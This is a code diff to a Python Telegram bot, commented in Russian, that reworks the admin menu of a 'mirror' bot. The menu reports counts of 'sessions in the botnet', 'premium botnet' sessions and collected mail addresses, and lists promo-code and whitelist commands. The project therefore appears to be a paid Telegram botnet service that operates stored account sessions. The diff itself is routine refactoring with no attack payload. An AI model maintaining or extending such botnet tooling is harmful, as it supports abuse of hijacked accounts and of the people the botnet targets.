@@ -47,15 +47,31 @@ def _build_mirror_dispatcher(token: str) -> tuple[Bot, Dispatcher]:
     async def mirror_admin(message: types.Message):
         if message.chat.id not in config.ADMINS:
             return
-        from main import admin
-        # Подменяем bot в контексте на mirror_bot для ответа
         import main as main_module
-        _orig_bot = main_module.bot
-        main_module.bot = mirror_bot
+        # Строим текст напрямую — без мутации глобала main_module.bot
+        import os as _os
+        session_folder = 'sessions'
+        session_folder_prem = 'prem_sessions'
+        users_count = await main_module.db.get_users_count()
+        sessions_count = len(_os.listdir(session_folder)) if _os.path.exists(session_folder) else 0
+        sessions_count_prem = len(_os.listdir(session_folder_prem)) if _os.path.exists(session_folder_prem) else 0
         try:
-            await admin(message)
-        finally:
-            main_module.bot = _orig_bot
+            with open("mails.txt", "r", encoding="utf-8") as f:
+                mails_count = len([l for l in f if l.strip()])
+        except FileNotFoundError:
+            mails_count = 0
+        text = (
+            ">🤖 *Админ меню:*\n\n📊 *Статистика:*\n"
+            f"*├─👥 Всего пользователей:* `{users_count}`\n"
+            f"*├─🕒 Сессий в ботнете:* `{sessions_count}`\n"
+            f"*├─👑 Сессий в премиум ботнете:* `{sessions_count_prem}`\n"
+            f"*├─✉️ Почт добавлено:* `{mails_count}`\n\n"
+            "*/promo PROMOCODE DAYS ACTIVATIONS \- создать промокод*\n"
+            "*/on \- включить бота*\n*/off \- выключить бота*\n"
+            "*/addwl ID \- добавить в вайтлист*"
+        )
+        import keyboards as _kb
+        await mirror_bot.send_message(message.chat.id, text, reply_markup=_kb.admin_markup, parse_mode="MarkdownV2")
 
     # ─── /start ───────────────────────────────────────────────────────────────
     @dp.message_handler(commands=['start'])
@@ -243,7 +259,6 @@ def _build_mirror_dispatcher(token: str) -> tuple[Bot, Dispatcher]:
             return
 
         await state.finish()
-        mirror_count = await db.count_user_mirrors(uid)
 
         if await db.token_exists(new_token):
             await mirror_bot.send_message(uid, "❌ *Этот токен уже зарегистрирован!*", parse_mode="Markdown")
